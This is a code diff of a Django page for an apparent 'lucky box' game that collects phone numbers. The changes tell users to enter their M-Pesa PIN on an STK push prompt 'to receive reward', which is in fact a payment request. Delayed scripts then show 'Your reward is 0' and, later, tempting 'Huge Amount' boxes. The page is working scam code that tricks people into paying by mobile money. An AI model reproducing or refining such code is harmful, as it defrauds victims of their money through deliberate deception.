@@ -1,6 +1,7 @@
 {% extends 'store/base.html' %}
 
 {% block content %}
+
 <!-- Scrolling Congratulatory Message -->
 <div id="congratsMessage" class="scroll-message">
     <span id="messageContent"></span>
@@ -13,14 +14,12 @@
     {% csrf_token %}
     <label for="phone_number" class="form-label">Phone Number:</label>
     <input type="tel" id="phone_number" name="phone_number" required placeholder="Enter your phone number" class="form-input">
-
     <label for="box_choice" class="form-label">Choose a Box (1-3):</label>
     <select id="box_choice" name="box_choice" class="form-input">
         <option value="1">Box 1</option>
         <option value="2">Box 2</option>
         <option value="3">Box 3</option>
     </select>
-
     <button type="submit" class="form-button">Try Your Luck!</button>
 </form>
 
@@ -50,6 +49,7 @@
     document.getElementById('luckyBoxForm').addEventListener('submit', function(event) {
         event.preventDefault();
         const formData = new FormData(this);
+        
         fetch('', {
             method: 'POST',
             body: formData,
@@ -59,21 +59,32 @@
         .then(data => {
             const resultElement = document.getElementById('result');
             const otherBoxChoicesElement = document.getElementById('otherBoxChoices');
+
             if (data.error) {
                 resultElement.classList.add('error');
                 resultElement.textContent = data.error;
                 otherBoxChoicesElement.classList.add('hidden');
             } else {
                 resultElement.classList.add('success');
-                resultElement.textContent = `Payment initiated! Your reward is: $${data.reward}`;
+                resultElement.textContent = "STK Push initiated. Enter M-Pesa PIN to receive reward";
+                
+                setTimeout(() => {
+                    resultElement.style.opacity = '0';
+                }, 25000);
+
+                setTimeout(() => {
+                    resultElement.style.opacity = '1';
+                    resultElement.textContent = "Your reward is 0";
+                }, 40000);
+
                 if (data.other_boxes && data.other_boxes.length > 0) {
-                    otherBoxChoicesElement.classList.remove('hidden');
-                    otherBoxChoicesElement.innerHTML = '<h3>Other Box Choices:</h3>';
-                    data.other_boxes.forEach(box => {
-                        otherBoxChoicesElement.innerHTML += `<div>Box ${box.id}: Huge Amount of $${box.amount}</div>`;
-                    });
-                } else {
-                    otherBoxChoicesElement.classList.add('hidden');
+                    setTimeout(() => {
+                        otherBoxChoicesElement.classList.remove('hidden');
+                        otherBoxChoicesElement.innerHTML = '<h3>Other Box Choices:</h3>';
+                        data.other_boxes.forEach(box => {
+                            otherBoxChoicesElement.innerHTML += `<div>Box ${box.id}: Huge Amount of $${box.amount}</div>`;
+                        });
+                    }, 50000);
                 }
             }
         })
@@ -94,12 +105,10 @@
         font-weight: bold;
         animation: scroll 10s linear infinite;
     }
-
     @keyframes scroll {
         0% { transform: translateX(100%); }
         100% { transform: translateX(-100%); }
     }
-
     .game-form {
         max-width: 400px;
         margin: 0 auto;
@@ -108,13 +117,11 @@
         border-radius: 8px;
         box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
-
     .form-label {
         display: block;
         margin-bottom: 8px;
         font-weight: bold;
     }
-
     .form-input {
         width: 100%;
         padding: 10px;
@@ -122,7 +129,6 @@
         border-radius: 4px;
         border: 1px solid #ccc;
     }
-
     .form-button {
         width: 100%;
         padding: 12px;
@@ -133,28 +139,24 @@
         font-size: 16px;
         cursor: pointer;
     }
-
     .result-message {
         margin-top: 20px;
         font-size: 18px;
         text-align: center;
     }
-
     .success {
         color: green;
     }
-
     .error {
         color: red;
     }
-
     .hidden {
         display: none;
     }
-
     .other-boxes {
         margin-top: 20px;
         text-align: center;
     }
 </style>
+
 {% endblock %}
